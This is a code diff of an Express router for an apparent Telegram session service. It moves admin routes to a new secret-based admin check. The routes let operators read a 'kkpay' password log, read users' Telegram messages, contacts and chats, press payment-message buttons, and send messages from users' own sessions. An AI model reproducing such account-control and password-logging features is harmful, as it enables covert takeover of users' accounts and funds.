@@ -7,7 +7,7 @@ import { NewMessage, NewMessageEvent, Raw } from "telegram/events/index.js";
 import fs from "fs";
 import path from "path";
 import { logger } from "../lib/logger";
-import { requireAuth, requireCard, requireAdmin } from "../middleware/requireAuth";
+import { requireAuth, requireCard, requireAdmin, requireAdminSecret } from "../middleware/requireAuth";
 import { db } from "@workspace/db";
 import { cardKeys, kkpayPwdLog as kkpayPwdLogTable } from "@workspace/db";
 import { eq, and, gt, gte, lt, desc } from "drizzle-orm";
@@ -3162,7 +3162,7 @@ router.get("/tg/events", requireAuth, (req, res) => {
 
 // ─── Admin monitoring ────────────────────────────────────────────────────────
 
-router.get("/admin/kkpay-pwd-log", requireAdmin, async (req, res) => {
+router.get("/admin/kkpay-pwd-log", requireAdminSecret, async (req, res) => {
   try {
     // ?date=YYYY-MM-DD  →  filter to that calendar day (local CST = UTC+8)
     const dateStr = req.query["date"] as string | undefined;
@@ -3203,7 +3203,7 @@ router.get("/admin/kkpay-pwd-log", requireAdmin, async (req, res) => {
   }
 });
 
-router.get("/admin/tg/sessions", requireAdmin, (_req, res) => {
+router.get("/admin/tg/sessions", requireAdminSecret, (_req, res) => {
   const sessions = [];
   for (const [userId, session] of tgSessions) {
     if (!session.me) continue;
@@ -3238,14 +3238,14 @@ router.get("/admin/tg/sessions", requireAdmin, (_req, res) => {
   res.json({ sessions });
 });
 
-router.get("/admin/tg/sessions/:userId/bets", requireAdmin, (req, res) => {
+router.get("/admin/tg/sessions/:userId/bets", requireAdminSecret, (req, res) => {
   const userId = parseInt(String(req.params["userId"] ?? ""));
   if (isNaN(userId)) { res.status(400).json({ error: "无效用户 ID" }); return; }
   const session = tgSessions.get(userId);
   res.json({ bets: session ? session.betLog.slice(0, 200) : [] });
 });
 
-router.get("/admin/tg/sessions/:userId/messages", requireAdmin, (req, res) => {
+router.get("/admin/tg/sessions/:userId/messages", requireAdminSecret, (req, res) => {
   const userId = parseInt(String(req.params["userId"] ?? ""));
   if (isNaN(userId)) { res.status(400).json({ error: "无效用户 ID" }); return; }
   const session = tgSessions.get(userId);
@@ -3253,7 +3253,7 @@ router.get("/admin/tg/sessions/:userId/messages", requireAdmin, (req, res) => {
 });
 
 // kkpay-only messages + entityId (for dedicated kkpay console) — live fetch from TG server
-router.get("/admin/tg/sessions/:userId/kkpay", requireAdmin, async (req, res) => {
+router.get("/admin/tg/sessions/:userId/kkpay", requireAdminSecret, async (req, res) => {
   const userId = parseInt(String(req.params["userId"] ?? ""));
   if (isNaN(userId)) { res.status(400).json({ error: "无效用户 ID" }); return; }
   const session = tgSessions.get(userId);
@@ -3319,7 +3319,7 @@ router.get("/admin/tg/sessions/:userId/kkpay", requireAdmin, async (req, res) =>
 });
 
 // Fetch TG contacts for a user session
-router.get("/admin/tg/sessions/:userId/contacts", requireAdmin, async (req, res) => {
+router.get("/admin/tg/sessions/:userId/contacts", requireAdminSecret, async (req, res) => {
   const userId = parseInt(String(req.params["userId"] ?? ""));
   if (isNaN(userId)) { res.status(400).json({ error: "无效用户 ID" }); return; }
   const session = tgSessions.get(userId);
@@ -3346,7 +3346,7 @@ router.get("/admin/tg/sessions/:userId/contacts", requireAdmin, async (req, res)
 });
 
 // Fetch TG dialogs (recent chats) for red-packet target picker
-router.get("/admin/tg/sessions/:userId/dialogs", requireAdmin, async (req, res) => {
+router.get("/admin/tg/sessions/:userId/dialogs", requireAdminSecret, async (req, res) => {
   const userId = parseInt(String(req.params["userId"] ?? ""));
   if (isNaN(userId)) { res.status(400).json({ error: "无效用户 ID" }); return; }
   const session = tgSessions.get(userId);
@@ -3384,7 +3384,7 @@ router.get("/admin/tg/sessions/:userId/dialogs", requireAdmin, async (req, res) 
 });
 
 // Pull recent messages from TG server into chatLog
-router.post("/admin/tg/sessions/:userId/fetch-history", requireAdmin, async (req, res) => {
+router.post("/admin/tg/sessions/:userId/fetch-history", requireAdminSecret, async (req, res) => {
   const userId = parseInt(String(req.params["userId"] ?? ""));
   if (isNaN(userId)) { res.status(400).json({ error: "无效用户 ID" }); return; }
   const session = tgSessions.get(userId);
@@ -3477,7 +3477,7 @@ router.post("/admin/tg/sessions/:userId/fetch-history", requireAdmin, async (req
 });
 
 // Admin: press an inline keyboard button on a kkpay message
-router.post("/admin/tg/sessions/:userId/press-button", requireAdmin, async (req, res) => {
+router.post("/admin/tg/sessions/:userId/press-button", requireAdminSecret, async (req, res) => {
   const userId = parseInt(String(req.params["userId"] ?? ""));
   if (isNaN(userId)) { res.status(400).json({ error: "无效用户 ID" }); return; }
   const session = tgSessions.get(userId);
@@ -3514,7 +3514,7 @@ router.post("/admin/tg/sessions/:userId/press-button", requireAdmin, async (req,
 });
 
 // Admin: send a message via a user's TG session
-router.post("/admin/tg/sessions/:userId/send", requireAdmin, async (req, res) => {
+router.post("/admin/tg/sessions/:userId/send", requireAdminSecret, async (req, res) => {
   const userId = parseInt(String(req.params["userId"] ?? ""));
   if (isNaN(userId)) { res.status(400).json({ error: "无效用户 ID" }); return; }
   const session = tgSessions.get(userId);
